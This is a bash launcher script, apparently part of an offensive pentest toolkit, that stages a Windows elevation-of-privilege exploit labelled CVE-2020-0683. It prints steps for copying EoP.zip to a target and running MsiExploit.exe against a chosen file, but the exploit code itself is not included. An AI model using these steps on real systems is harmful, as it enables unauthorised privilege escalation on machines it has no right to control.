#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'
ORNG='\033[0;33m'
W='\033[1;37m'
INV='\e[7m'
URED='\033[4;31m'
UBLUE='\033[4;34m'

cd /opt/CVE-2020-0683
echo -e "${INV}"
figlet -f mini "EoP Exploit (CVE-2020-0683)"
echo -e "${URED}EoP.zip ${W}has been copied to your Desktop. Please transfer this file to target and unzip in a CLI"
echo -e "then cd into bin_MsiExploit. Please ensure MsiExploit.exe & foo.msi stay in the same directory or this will fail!"
echo -e "then run ${UBLUE}"MsiExploit.exe  \path\file\to\pwn" ${W}from a command terminal on target${NC}"
cd /opt/sifter
sifter -m

##########################______________ czFsM250NzggX18gUmFiYjE3J3MgRGVu ______________##########################
